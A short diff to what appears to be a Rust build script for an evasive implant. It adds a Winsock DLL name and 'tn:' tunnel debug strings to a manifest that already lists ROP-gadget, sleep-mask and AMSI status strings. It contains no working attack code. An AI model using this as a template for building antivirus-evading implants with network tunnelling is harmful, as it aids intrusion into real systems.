@@ -56,6 +56,7 @@ fn main() {
     manifest.push("iphlpapi.dll".to_string());
     manifest.push("advapi32.dll".to_string());
     manifest.push("user32.dll".to_string());
+    manifest.push("ws2_32.dll".to_string());
     manifest.push("gdi32.dll".to_string());
     // Debug-channel literals (config::DEBUG builds only; a false build
     // const-folds every site away, and absence is fine for the guard).
@@ -72,6 +73,15 @@ fn main() {
     manifest.push("bs: gadget none".to_string());
     manifest.push("bs: gadget ff23".to_string());
     manifest.push("bs: gadget addrsp".to_string());
+    manifest.push("tn: start ok".to_string());
+    manifest.push("tn: recv".to_string());
+    manifest.push("tn: write".to_string());
+    manifest.push("tn: sel".to_string());
+    manifest.push("tn: tick".to_string());
+    manifest.push("tn: closetask".to_string());
+    manifest.push("tn: tunnels".to_string());
+    manifest.push("tn: noexport".to_string());
+    manifest.push("tn: close".to_string());
     manifest.push("bs: sleepmask ok".to_string());
     manifest.push("bs: amsi ok".to_string());
     manifest.push("bs: heap ok".to_string());
